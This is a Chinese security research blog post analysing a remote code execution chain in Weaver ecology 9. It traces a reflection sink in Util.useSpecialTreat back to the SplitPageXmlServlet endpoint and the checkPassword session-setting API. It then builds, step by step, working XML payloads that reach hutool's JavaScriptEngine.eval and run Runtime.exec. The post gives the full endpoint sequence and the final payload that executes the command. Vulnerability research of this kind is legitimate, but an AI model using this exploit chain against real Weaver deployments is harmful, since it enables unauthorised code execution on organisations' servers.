#  泛微ecology 历史漏洞浅析(二)  
原创 路人甲
                    路人甲  红细胞安全实验室   2026-05-14 03:19  
  
## 前言  
  
在泛微ec9中，除了一些如代码执行、jdbc等常规的漏洞外，还有一种漏洞类型也可以关注下，这个类型就是反射调用，可以指定特定类的特定方法进行调用  
## sink寻找  
  
前面我们说过，可以在工具类中发现一些非常规的漏洞利用点，而今天说的这个利用点，即能从工具类中发现，也可以通过关键字搜索；搜索反射调用，我比较喜欢搜索.getMethod(  
，为什么呢？因为搜Class.forName(  
和.invoke(  
能搜出很多调用，筛选起来比较麻烦，搜索.getMethod(  
时，可以筛选出很多固定方法调用，我们只需要找到哪些可以自定义的方法然后排查就可以了，通过筛选，我们找到com.weaver.general.Util#useSpecialTreat  
这样一个方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XmtkoZibdEyq4HrDfPic6xhV5ZMibicbB4QErPJ3a9yibSlr6usDIBflIpYaVUR0VCyJIyUI2lJczTR3iaPALcJ3POI51UgicsQu6DXKU/640?wx_fmt=png&from=appmsg "")  
  
在useSpecialTreat  
方法中，可以指定三个String  
类型的参数，var0  
为类名+方法名的拼接，var1  
作为第一个参数，var2  
作为第二个参数，可选；然后进行反射加载  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XlJnUpE6CtqYQfwokNTjcgo19K1YTxcuTpK1aoGnOmDuJNVIfCO4nwCiaJPM1EU7pPiaI92zGQKqr7bluVbdm1hXbT8gQLqJicico4/640?wx_fmt=png&from=appmsg "")  
  
var9.newInstance((Object[])null)  
加载的方式是对被加载的类有要求的，要求如下：  
1. 某个可加载类中的public  
实例方法  
  
1. 类必须存在public  
无参构造方法（因为调用了.newInstance()  
）  
  
1. 方法参数为1  
个或者2  
个，且为String  
类型（因为有判断，var2  
为NULL  
会去找1  
个参数的方法，反之找2  
个参数的方法）  
  
1. 返回值为String  
，不过无所谓，因为最终结果虽然会因为非String  
类型而导致抛出强转类型的异常，但不影响反射调用已经执行  
  
其实能够利用的类还是比较多的，这里我们挑选一些常见的第三方高频引入的工具类，类似Apache Commons  
系列，这里我们使用的是hutool-all-5.3.0.jar  
依赖中的cn.hutool.script.JavaScriptEngine  
类，该类有无参构造方法，并且也存在参数为String  
类型并且数量只有1  
个的eval(String script)  
方法，可以调用到js  
引擎执行表达式  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0Xn5R2VhVbTRjTVCbp0c96hMiaF4miciaU2dECq8LYdNKRtcTeJ3LYDlvZQvXsvoyjXVQOo3G81eHJBzhvuMA804UcGSMTDbZibPsTw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XlKsD80CWWfXookeubiauNc8NmvnyibuNibrkSRvFML4RlPR7OVwQicYRUhLBibJN1t8CJVSJAz1ibNdYMs3Z7KLrmcN5tt3s97BSQsA/640?wx_fmt=png&from=appmsg "")  
  
这里为了验证我们之前的分析，我们构造一个demo  
来尝试进行调用，这里我们需要把第二个参数设置成null  
，使其走进if (var2 == null) { ... }  
的逻辑中，让他去调用我们指定的单String  
参数的eval  
方法  
```
import static com.weaver.general.Util.useSpecialTreat;public class Test11 {    public static void main(String[] args) throws Exception {        useSpecialTreat("cn.hutool.script.JavaScriptEngine.eval", "java.lang.Runtime.getRuntime().exec('open -a Calculator')", null);    }}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0Xko8QAbNMcAPHWl6q57fubbOaDic1NkqvSwuy7n81Q3b1n1z1PvySVfnKgNBLLaiaW0NUn7Tft72iaysAdfian3HTVP8icibVBkhUeng/640?wx_fmt=png&from=appmsg "")  
## sink -> source  
  
通过回溯，最终在weaver.common.util.taglib.SplitPageXmlServlet  
的getXmlNew  
方法中调用了Util.useSpecialTreat  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0Xmv5zWxtCzt1w8PDkq4rNMv05D6xDzOvGQ2Uc40DB8YTbK1c7PZTaz5SsK0meAvWxdIjuyLDh5S1csQqmB9Mu4KPpeM7E7BF64/640?wx_fmt=png&from=appmsg "")  
  
而getXmlNew  
在同样也被getXml  
调用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XkXmvpJ6OGnUQBTwtNoIPicb6ibr0CibTgwf4wBibPfAOeystA3YKiaOOvibvUAgiaUubk9GmHg6jpQgFTSLoNp8icT3tLMukRt9zticbTM/640?wx_fmt=png&from=appmsg "")  
  
getXml  
和getXmlNew  
都在doPost  
中被调用，var28  
或者var54  
任意一个不为空可调用getXmlNew  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0Xmf9pVwv8xbVT400EbB8q4IrxFlWdQLD0nXIFodtsTlJWdPbMCzse8ev64nAQoLP1rhTN6Oz2ic3GEMMWicKhFEgn1vjYbSDsVF0/640?wx_fmt=png&from=appmsg "")  
  
weaver.common.util.taglib.SplitPageXmlServlet  
在web.xml  
中已经定义  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XmKSzrrnc4N6GD6zC2nmRE8e3LmrLjNa68X09Ml7Gj2BdVteJxDBNxORmEcFUUqIUk9IFnh5bmTmSoXowRXib1brCvwvy1ibZPlk/640?wx_fmt=png&from=appmsg "")  
  
可以直接通过/weaver/weaver.common.util.taglib.SplitPageXmlServlet  
进行调用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XnFiaOfpWwcPgPpjr8a0rOzYc9JdqicicboBr3TWHCMWPNh7ZP2U9fbrSrQn2C3H9LKdGyrvrm9xicPevSqhUa1lbZTqdJL9YVG59o/640?wx_fmt=png&from=appmsg "")  
  
这里流程复杂，我们并不清楚最终所需的参数是否可控，所以只能反向追踪；回到getXmlNew  
中，可以看到所需的var54  
、var114  
都是从var13  
中获取的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XkzY0eKcuyJPk3FrVOZwH77MdrZcZn8KH8ImJF8k1OqoAI2PBh2Squ2YJdu7k5OXtfKnkKhAqGSxNEAdS7Suensw7SYJula6zI/640?wx_fmt=png&from=appmsg "")  
  
继续往上看var11  
必须为checkbox  
才会调用到，所以这里主要关注var11  
和var13  
两个参数  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xkyia7uJ2icZf59uFMibF6IA8rHViciceVSRfBTv0fAtLoY6QK0LVPLMMgvdbvZ6lM2G3L7mD8yjny8bSn7FicAxylly05QicgiaCGNtQU/640?wx_fmt=png&from=appmsg "")  
  
都是调用getXmlNew  
时所传递的第11  
和13  
个参数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XmqnTYxqaJjOb1zibVKzY9oxMdn5qY492IGGBI795zyMoUWX5z4WGuX4Z10qGwPe3xA11LUKhPKtCx01ss4lGVkicz6uGDbj3lwc/640?wx_fmt=png&from=appmsg "")  
  
回到doPost  
中，分别对应var31  
和var20  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XlIT4CxMLUsLAxKt8ZkNV7iacNTQgt18b8lxDnzs6avSJl69qc4nGTMiapjaeoWOicDiaHe0x1icsojHfib1q2DYMibRwd25MkgByKhx8/640?wx_fmt=png&from=appmsg "")  
  
而var20  
和var31  
都是从var21  
中获取  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XmiaPgRia2ic76WdlXN52xCFaa1AIQqE6Bnt1fVk58164KsPVASqxxS3yYC1BrGfnU1QlnBz4867YmJoyePwicdWWxRPxULkl0l6Sk/640?wx_fmt=png&from=appmsg "")  
  
而var21  
是通过传递tableString  
得到的值作为参数从Session  
对象中获取，然后转换成Document  
对象，所以这里从Session  
中获取的是一个xml  
格式的字符串  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xn5AdVeydpWgxLoxoEiaAC4RwWFOIM3jMibHr8JkRMVYicteELKH2BJ8832CPrL6UuWiabSEibec9YbLMy9vPpic4CnPPsf6JvBNL5ZQ/640?wx_fmt=png&from=appmsg "")  
  
这里有的人可能有些疑问，Session  
中的值，我们并不可控，怎么能获取到我们所需的数据呢？确实如此，但是这里可以指定tableString  
，也就是属性的key  
，说明大概率是有地方可以设置的，这里作为一个必要参数，可以先再找找是否有相关的利用点，如果没有的话，就属于死路没必要继续了  
## 寻找必要条件  
  
我们主要目的是寻找一个可以控制属性key  
对应的value  
的点，那么我们通过搜索.setAttribute("  
，可以找到大量调用点，筛选后找到一个可以利用的点  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xlc2icDu0gk3nBic8qOpLCnftFalqflsSkUbOQCKzRogWsDV33Y5hhVwLpHXicRQHIibLmsTJvzxpVuVVh6ia4Cu8aaNbW0WkebEU9M/640?wx_fmt=png&from=appmsg "")  
  
在com.api.hrm.cmd.password.CheckPasswordCmd#execute  
方法中，可获取password  
参数，然后设置到Session  
对象中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xnj9dJHWH55OHl67dNbhIyFbQWLD7LjLBgQEIrPAjlIic5kJBnAdL7XW9KWGD5tMo0IGwpWjDjDXic624xnDL5ibh84WJsEKF660k/640?wx_fmt=png&from=appmsg "")  
  
通过反向追踪，找到入口com.api.hrm.web.HrmSecondaryPwdAction#checkPassword  
，对应的接口为/api/hrm/secondarypwd/checkPassword  
，this.getService(var4).checkPassword  
实际上调用的就是com.api.hrm.cmd.password.CheckPasswordCmd#execute  
方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XkbrhiaEcQP9HWHbXS0H0WycCUJrd7JaBdwC3kl5Veo1yaL8nPrSCRMXx0PnCMsXzib1iaA2lNzACJCm9hDYcaQcF48W5et8pAfNw/640?wx_fmt=png&from=appmsg "")  
## 利用构造  
  
根据反向追踪调用点章节的分析，我们必须要拿到var20  
和var31  
作为参数传入getXmlNew  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XkKTdV8hAsO8Nb8cvbwibiae5As2LUbFLC7CdIe93sMoDwMaQXbh8icS3ticiaib0xhNZFyhoUajJIWGdybox4tp9ASaLc2jr4SFuuw8/640?wx_fmt=png&from=appmsg "")  
  
checkboxpopedom  
为子元素，tabletype  
为根元素的属性，sink  
点从Element var13  
中拿到showmethod  
属性用于传入Util.useSpecialTreat  
作为调用的类，而popedompara  
属性则被作为调用的方法，所以构造如下：  
```
<root tabletype="checkbox"><checkboxpopedom showmethod="cn.hutool.script.JavaScriptEngine.eval" popedompara="java.lang.Runtime.getRuntime().exec('calc.exe')"></checkboxpopedom></root>
```  
  
通过/api/hrm/secondarypwd/checkPassword  
插入Session  
对象中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XmH9EQGPUNDFnDElBz5HMXf7HNuEWFrOGnVjZcmrMiaP2OpHrziaCXwm0Q9XdbLoTROgaQjvof8LtwPDw3cBibJ5DuiccfE6A157iaM/640?wx_fmt=png&from=appmsg "")  
  
然后通过tableString=loginPassword  
的方式触发  
  
实际情况不会一帆风顺，所以我们触发前打上断点，跟一下调用流程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XlRs58w3yDMClRA7DoPXfUmszJ7hEcSyhCbtFa75juw0k92ia9ISQUpEqxbqf2Z4YicZAqb1vkQzOakfqx0e1p62rkOfdngMC4SE/640?wx_fmt=png&from=appmsg "")  
  
checkboxpopedom  
和tabletype  
都能正常获取  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XlnxDr9v4Uvqthk7eiabwdUk7rKyPFkjDHEhaJAEUTSrpDPoVhU4VOKISe0URmjSxtZPpa2O9o1tbV7JYKtVqhfHelYfRhBdicGI/640?wx_fmt=png&from=appmsg "")  
  
但是执行到如下便报错了，获取var9  
的sqlhint  
属性时  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XkQm2hK6vl48V5aptEbAsBKliast91CltUJaELbw6rA0AlN1njnAsHVfJsVZmHQVazGOMkYAPGeyYI3rWhrLfZxm4kOJS1L6Ito/640?wx_fmt=png&from=appmsg "")  
  
反向追踪var9  
，发现并没有传入sql  
，所以这里var9  
默认是NULL  
，再去调用getAttributeValue  
时才会报错  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XmyWvzC8gMewkK9OyFmuQYe17OyicuVlkVFHjiajwhaPbX3iaMrUnq9RyLWticRntThia97r6KluVEqekt3v3mw4rbLPnJYezq3QzoQ/640?wx_fmt=png&from=appmsg "")  
  
接下来，我们在xml  
中补充上sql  
标签，再次尝试，成功走到了下一行，不再报错了  
```
<root tabletype="checkbox"><checkboxpopedom showmethod="cn.hutool.script.JavaScriptEngine.eval" popedompara="java.lang.Runtime.getRuntime().exec('calc.exe')"></checkboxpopedom><sql></sql></root>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XkezsfO0os9qe5a12IqSTe29ibia7wmXIsEOgCD7hXUsmicvyiaC8JwAbGvfibMTDn5ribulw2mKibEbATyeALbdhBUPmO0d5gockgxT8/640?wx_fmt=png&from=appmsg "")  
  
接着，来到如下这一行依然会报错，原因是没传入sqlsortway  
，并且也没用Util.null2String  
进行处理，导致空指针异常  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0Xnsolth0DLfGTbchNtRG25Bsibr99w69OhtdiaB8ZAHFASBYUPUwibia9nRGNI0ibkH0OK0ic7M5osqqCycl54xnEOptSaZMdWI5hIU0/640?wx_fmt=png&from=appmsg "")  
  
sql  
标签中增加sqlsortway="DESC"  
```
<root tabletype="checkbox"><checkboxpopedom showmethod="cn.hutool.script.JavaScriptEngine.eval" popedompara="java.lang.Runtime.getRuntime().exec('calc.exe')"></checkboxpopedom><sql sqlsortway="DESC"></sql></root>
```  
  
继续，没有问题；来到getXmlNew  
前，有一个判断，var28  
和var54  
其中一个不为空的情况下会进入getXmlNew  
，这里没传任何值，进入了else  
中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XluThYRboicdFice3NQKOqwBvzX6qqQo5KVcibeE9F6Hj12kBZHHOSPcQ4BrEHeg2xiaJpz5Mjn4P3B0XpAgQEZIjm6wU2B0EkVNia4/640?wx_fmt=png&from=appmsg "")  
  
getXml  
同样也会调用到getXmlNew  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XkhfOAwRR68eb9xDoIFoycicUjmGJxVhf7zPyvibYhsgSCdbPZjfs5I9INjKu2yPfRrQDmZ6Voia6VXqeaFEupTj4GKY2klbtfS4E/640?wx_fmt=png&from=appmsg "")  
  
跟入到ShowColUtil.sort(var16, var18, var7, var17);  
时发生了报错，仔细看了下var7  
为NULL  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0Xmth3b2LmHibfCAY6UOEHj4Oc3ib94nictYw2833kSdLpeDRCerYf0K6rYV4tgia9V0B4qbPV8drhk3lTiaLeaa5nImNwm3JGXChZhQ/640?wx_fmt=png&from=appmsg "")  
  
跟入到sort  
方法中，var2  
为NULL  
，也就是getXmlNew  
方法传入的var7  
参数，但却调用了getChildren  
方法，所以报空指针异常  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XnmjDwfEa9RticurcjwESjRrJbibjm1qI4NIkvbaRG5vXLJLuYO84ob5U7E4ia6qujXcI3gvpjtYbzIpjxNRT8bHq9xVBkvXCKAXI/640?wx_fmt=png&from=appmsg "")  
  
接下来，我们反向追踪var7  
参数是如何传参的，入参为第七个  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xlkv85NiczhQaIHZtkb0SoXDANPY188icTTbNNvY91XVtibgGiasufABPlFpibgNl8CPjnyaAlKDQgVKP8UtlzmSwRaSwIVbTeCBxuc/640?wx_fmt=png&from=appmsg "")  
  
对应的是doPost  
方法中的var17  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xkjy9JCC6fmiaIcwh0ib4XWiasBREmdAcnwhe8Ie6wUDr1VbfsjN8fVXfpT1IQDuCaNTumfqDK7bDy3t3JEap8ibbFuibkeVxvFrY1I/640?wx_fmt=png&from=appmsg "")  
  
继续追踪，找到var21.getChild("head")  
，从根标签中获取子标签head  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XnVORO6OdvxCedjf5v6kvuwu6EFla7UXgJfP26YbIxtL0W0rV0mmA9Y7R0ftYBicwmMjlez5tqicfHgVfGapjPUNhG6NPAPcnaRA/640?wx_fmt=png&from=appmsg "")  
  
我们在xml  
中添加上子标签  
```
<root tabletype="checkbox"><checkboxpopedom showmethod="cn.hutool.script.JavaScriptEngine.eval" popedompara="java.lang.Runtime.getRuntime().exec('calc.exe')"></checkboxpopedom><sql sqlsortway="DESC"></sql><head></head></root>
```  
  
已经成功进入了下一行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0Xm3wdOVfTDtStZE2KicSoLaNbptYa3ePvlVicqnLgkfFdhzdb7gJgzXVHF5iaz6G6WFJAoAqNUKzFOibsnhFiaLTjw6kkSgVxmfIOb8/640?wx_fmt=png&from=appmsg "")  
  
来到一个for  
循环遍历中，我们的漏洞利用点Util.useSpecialTreat  
就在其中，但var8  
的长度为0  
，默认情况是进不到for  
循环分支中的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XnlrVnNDL9tU35bWb1vNkMvKT5CKKicDHEDKQ2l6yubJpcFafUW2jnDcn5ibq0E8t8DvnVow9wWgSFnRib6OObAzQarcl4XGrQ2us/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XnarXhDQMdgPXyBzMvSPiaM8ibm0YRX19KaXUlTxuIvRYp4U3N5rFBQ8qJpNcibE9DtK4g9yW0l4ThOezJGkBgTgM4lqAlyeL9ib3g/640?wx_fmt=png&from=appmsg "")  
  
我们还是继续反向追踪var8  
来源，在getXml  
中，var8  
对应的是var18  
；其值来源是调用CssRenderDeal.recordSet2Map(var8)  
进行添加  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XkB3NfEnltXxIlSwfJTrJMC2ZN11WDz9YyM5vtcV3y5RC0nVzCVbjHrxfY787UrKIZeDvQfpaQzuxSA67klr81Jlm8AbmlFBjs/640?wx_fmt=png&from=appmsg "")  
  
在recordSet2Map  
方法中，var0  
为sql  
查询结果集，通过遍历，将结果转换为HashMap  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XkkblUrn2omA38Bic4BEY0FGOxRcCqjMzdcbmNcPDcHDmW7Z2Ol9QqgNf8HmOWxibA1yLOtCKdTkrn8OJxoIQDUIeRYbsGzz4rdc/640?wx_fmt=png&from=appmsg "")  
  
接着我们追踪var8  
来源，来到doPost  
方法中，与之对应的是getXml  
方法的var15  
参数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XleaNIkzLibmenRpCIu505Ekj52FEX8msMGjg5vibyMAElYuptmgWZhb8OFEyulYEIdvFOBQMs5772zUDZvMRoRdlPwt9jMxZq1s/640?wx_fmt=png&from=appmsg "")  
  
通过向上回溯，调用了var14.getCurrentPageRsNew(var126, var127)  
方法，将其返回值赋值给了var15  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XkTG5oElf7ZCPBIfYG4hmnfnxfGynueXFT1sfI63wlia4t2f4DHJaE2fFCePlPIH4l1iabJoI8icOIdicSibIfZuYeSGyqIzvR9QxnI/640?wx_fmt=png&from=appmsg "")  
  
跟入到getCurrentPageRsNew  
方法中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XnSwgonK2qnPwFyD2IrebPa8fBd2fZ4kV76pejGOqEhmibLibPUArNdu7vjaSFsn7hqjWp8J1ficmfBUsXs1uCg6c8uA6rax2E5Y0/640?wx_fmt=png&from=appmsg "")  
  
首先调用this.checkExcption()  
检查参数，this.spp  
及primaryKey  
、backFields  
、sqlFrom  
属性都不能为空  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XkZHDHGT0icRcggw3n4ZHhIIPnB1a2AGA9n1a5MnjLWMia5zvQOcefk7wAdcKdzskkEpo7NYOdKL7FV5vbkvky3iaodA5DJXI1nOI/640?wx_fmt=png&from=appmsg "")  
  
接着，判断数据库类型，这里我们是sqlserver  
，调用的是else  
中的this.getPageSql(var2, var1)  
方法构建sql  
语句  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XkSr5Sp2yMfBfMTTdmeFavks6tlQsuM5hYAEib7JlPUeTpNG3smwYWbYQKNiao58ghFve99OCobPh556CUqjMl1IBBYpjHRB1PkM/640?wx_fmt=png&from=appmsg "")  
  
getPageSql  
方法中内容有点多，但最终实际上就是获取this.spp  
中的属性组成sql  
语句，这里我们先不进行分析，我们先来看看this.spp  
是如何赋值的，随后传入参数，打上断点，看看最后的sql  
语句是什么样  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XkqqfNmmTyveWygJeqPVMicPIiaK59rldibzml4CZsMMCPsP63kDOuH1rkORlXbibJkiaUInYy2Ziav9oiaOSmc83UABjia8cXRvHFFggk/640?wx_fmt=png&from=appmsg "")  
  
就在getCurrentPageRsNew  
方法上面几行，就有对SqlFrom  
、PrimaryKey  
、BackFields  
进行赋值的点，分别对应var59  
、var61  
、var32  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XmHOFkCG4ac1mGmeicsCGxAUdb8Pq1O3Hy1UojNmAicwsIyvUibsBxnjFEGCibYBnD6PfjPia7tu7zMReiazdZUwV5nhZyZXFhXGicibkY/640?wx_fmt=png&from=appmsg "")  
  
向上追溯，其值都是通过获取var9  
的属性，还记得之前的分析吗，var9  
实际上就是传入的sql  
标签  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xkta02aicNzssjCZNuSBVbc0M5TvUmEzicjlJoS9U23EKu8eKEqxhIpOCkabKGO19ZwlRtc7hsAyh6icp6tL0xx8j90AqsvO3KEs0/640?wx_fmt=png&from=appmsg "")  
  
接着，我们继续给xml添加上对应属性  
```
<root tabletype="checkbox"><checkboxpopedom showmethod="cn.hutool.script.JavaScriptEngine.eval" popedompara="java.lang.Runtime.getRuntime().exec('calc.exe')"></checkboxpopedom><sql sqlsortway="DESC" backfields="1" sqlform="2" sqlprimarykey="3"></sql><head></head></root>
```  
  
接着我们添加到session  
中，然后在getCurrentPageRsNew  
方法中打上断点获取返回的sql  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XmCEWeKYE5cD9oUHGia3iawb7FDd0cYhlqmQPwnWaO34BJQ9N8kpjjBEl8Otj6dI3eQvsOiaX8bxLK218balH5X2SRgKzIPnAs6WA/640?wx_fmt=png&from=appmsg "")  
  
得到sql  
如下，看起来挺复杂  
```
select outtemp1409477546046.* from (select row_number()over(order by tempcolumn1409477546046) temprownumber1409477546046,* from ( select  top  -1 tempcolumn1409477546046=0,1 from 2 order by 3 asc) innertemp1409477546046 ) outtemp1409477546046  where temprownumber1409477546046>0 order by temprownumber1409477546046
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XkZH6weviamK0Aicctmq8u4pQib6zcn1k4a7VOhc84ncekIaiaVRa2eIY7B0F32FawNBm1dxMCXw4JQ7SBWXVETsLz60DLXphTOB6c/640?wx_fmt=png&from=appmsg "")  
  
当我放进navicat  
中执行，发现出问题了，报错Incorrect syntax near '-'.  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XnYibdQpib0ibmxthDQrNUNmOEGvWiaicVl87VWOczQ0esm83GvoBMvm6bgoz7B3ynfZRjqMiafiaNoswkTWpkaX4xKndfUjkCxwCktz4/640?wx_fmt=png&from=appmsg "")  
  
仔细看了眼sql  
，发现有个select top -1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xnxlia3TGqRgSoOcjia3QJqnofZicFxOpF50Zh4IjyibnrRLl0pdtvmX0SuuT3bAiaEINUfYegJbnNMDGpYelnib0l69nDIr1m6vP3Zo/640?wx_fmt=png&from=appmsg "")  
  
进入到getPageSql  
方法中，找到对应的拼接点，发现该值是var1  
和var2  
的乘积  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xl3OUofic73icoicOiaFDZjDlf9yjiab8YXB3b1uOy99PEEtfjSbzRZLNEsJVNOF04g5QkFjfKuwQwWTcGlWricajSsRF9K5lQPsfRVE/640?wx_fmt=png&from=appmsg "")  
  
接着回溯var1  
和var2  
来源，分别对应var126  
、var127  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XmdnME97w9Thjtwo36KjN9Mfyjp6HC6noZaKZdSrRBvBuQgfPlY43tWGrzz9pIqp3QgNy75Qia5g9pvaPzdiaG2Gg5YCjmQxSb9k/640?wx_fmt=png&from=appmsg "")  
  
var126  
由参数pageIndex  
传入，没传递值时，默认是1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xm7iblsK9fhkj5RsYSUUs8oeOpcrU3pxNvcymRmsebMoFUuDJhic4Hp3hAAia0RmLoZAibylkgxJQwLWxiaxXWsyTdTJnSBckvySGfU/640?wx_fmt=png&from=appmsg "")  
  
var127  
是从根标签中获取pagesize  
属性的值  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xm2R5Lnv7HqibTrgD5G6wib53hQeciaiczS0KPLkxVwwxd4nKI1RqV2LiayUWv8JGCTiaNYwFLWCPdRfh3of5CuVQ3HC9CDx2ia6sePiaw/640?wx_fmt=png&from=appmsg "")  
  
接着构造：  
```
<root tabletype="checkbox" pagesize="1"><checkboxpopedom showmethod="cn.hutool.script.JavaScriptEngine.eval" popedompara="java.lang.Runtime.getRuntime().exec('calc.exe')"></checkboxpopedom><sql sqlsortway="DESC" backfields="1" sqlform="2" sqlprimarykey="3"></sql><head></head></root>
```  
  
这里我们先不着急提交，我们先在navicat  
中验证一下，现在不爆前面那个错误了，却爆了Incorrect syntax near '2'.  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XmqD7nMLL99D6taicIoHzYMLuNicsGHotoTZg5Bg29eI27r4Fd4CF5PYWoh697P8vJ3DhN6VTyl0c3Vso0E5Csruwf34pcxdR2pg/640?wx_fmt=png&from=appmsg "")  
  
仔细一看FROM 2  
肯定是不行的，还有ORDER BY  
的值也肯定不能是3  
，众所周知，ORDER BY  
的长度不能超过根查询的字段数量，这里只返回两个字段，所以不能超过2  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XmcsXa8p9MGiaicB1AHf9Ka6STmuQILwqCpDWcoWCm3ibXp3R4FIue3s0hDZx5CNPxv266oghv70WQ3nvJ6DGG5AAibs72NJdYs1W4/640?wx_fmt=png&from=appmsg "")  
  
我们随便找一个有值的表，如imagefile  
进行测试，ORDER BY  
的值换成2  
，发现依然报错，只不过这次是No column name was specified for columnxxx...  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0Xm3rv4qcczsk7pgfV2Xiayb0X4ncicV5lHyaGAJVLt4S4OLcBcE2zor7ML9bm5fjQia6bRNL9R5BUicCibKUdNOIK2x778uQgZaVuso/640?wx_fmt=png&from=appmsg "")  
  
这里的错误是因为temprownumber1409477546046  
的第二列我们没有指定列名，不能指定为1  
，所以我们换成imagefile  
中的字段名imagefileid  
，最终不报错，成功返回了值  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XnENgYUfBuYUpes35cdccEq25vxU9YG21Ag5YdCJ972KAGRRGB8yibNMBt8TrQe8agicRgWUjxNKTkib3eppam7viaibemZWXFHFY44/640?wx_fmt=png&from=appmsg "")  
  
随后替换xml中的相关参数得到：  
```
<root tabletype="checkbox" pagesize="1"><checkboxpopedom showmethod="cn.hutool.script.JavaScriptEngine.eval" popedompara="java.lang.Runtime.getRuntime().exec('calc.exe')"></checkboxpopedom><sql sqlsortway="DESC" backfields="imagefileid" sqlform="imagefile" sqlprimarykey="2"></sql><head></head></root>
```  
  
然后提交，现在var8  
中已经有值了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xn1MKxwVdGKdCQh5ictLa9s9xvCJgDqqDsGPeyz9p1XtEFFTNsmENZHVnbvv0f9mMOSAMphuDUAAGLOsUhUgYOoibSlGiaGk7nnzo/640?wx_fmt=png&from=appmsg "")  
  
并且也成功调用到Util.useSpecialTreat  
方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XkbhFf893T2kjhQ7vEgjG1XRRwfIE2mucLPWdHBrfYuAg3ResLMHjOAWsjcaQsHmjrROgYODwxuoLfxHIBia7UpAfJCDHA1j09w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XlfpKfJDX4nwVvLIgyH4X9N2nia8WeW2kiaIw8j2B6sPZF7XFwd1QEtbsLWrias2bxll4rz54llbYVHeHlJs2sJdYJcJB5Kjn6MHE/640?wx_fmt=png&from=appmsg "")  
  
最终成功执行代码  
  
